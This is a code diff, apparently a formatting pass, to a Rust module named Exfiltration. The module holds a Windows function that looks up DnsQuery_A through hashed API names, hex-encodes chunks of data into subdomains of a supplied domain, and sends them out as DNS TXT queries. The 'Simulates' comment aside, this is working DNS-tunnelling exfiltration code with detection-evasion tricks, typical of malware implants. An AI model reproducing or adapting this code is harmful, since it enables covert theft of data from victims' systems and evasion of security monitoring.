@@ -8,10 +8,10 @@ impl Exfiltration {
     /// Simulates sending data chunks via DNS lookups.
     #[cfg(target_os = "windows")]
     pub fn exfiltrate_dns(&self, data: &[u8], domain: &str) -> Result<(), ()> {
-        use alloc::string::String;
-        use alloc::format;
         use crate::utils::api_resolver::{hash_str, resolve_function};
         use crate::utils::windows_definitions::HANDLE;
+        use alloc::format;
+        use alloc::string::String;
 
         unsafe {
             let dnsapi = hash_str(b"dnsapi.dll");
@@ -24,10 +24,17 @@ impl Exfiltration {
             }
 
             let dns_query = resolve_function(dnsapi, hash_str(b"DnsQuery_A"));
-            if dns_query.is_null() { return Err(()); }
+            if dns_query.is_null() {
+                return Err(());
+            }
 
             type FnDnsQueryA = unsafe extern "system" fn(
-                *const u8, u16, u32, *mut core::ffi::c_void, *mut *mut core::ffi::c_void, *mut core::ffi::c_void
+                *const u8,
+                u16,
+                u32,
+                *mut core::ffi::c_void,
+                *mut *mut core::ffi::c_void,
+                *mut core::ffi::c_void,
             ) -> i32;
 
             // Break data into chunks (base64 or hex)
@@ -37,7 +44,7 @@ impl Exfiltration {
                 for &b in chunk {
                     hex_chunk.push_str(&format!("{:02x}", b));
                 }
-                
+
                 let query = format!("{}.{}", hex_chunk, domain);
                 let mut query_c = alloc::vec::Vec::from(query.as_bytes());
                 query_c.push(0);
@@ -46,13 +53,13 @@ impl Exfiltration {
                 // DNS_TYPE_TEXT = 0x0010, DNS_QUERY_STANDARD = 0x00000000
                 core::mem::transmute::<_, FnDnsQueryA>(dns_query)(
                     query_c.as_ptr(),
-                    0x0010, 
+                    0x0010,
                     0,
                     core::ptr::null_mut(),
                     &mut results,
-                    core::ptr::null_mut()
+                    core::ptr::null_mut(),
                 );
-                
+
                 // Usually we'd free results here if we were doing a real lookup
             }
 
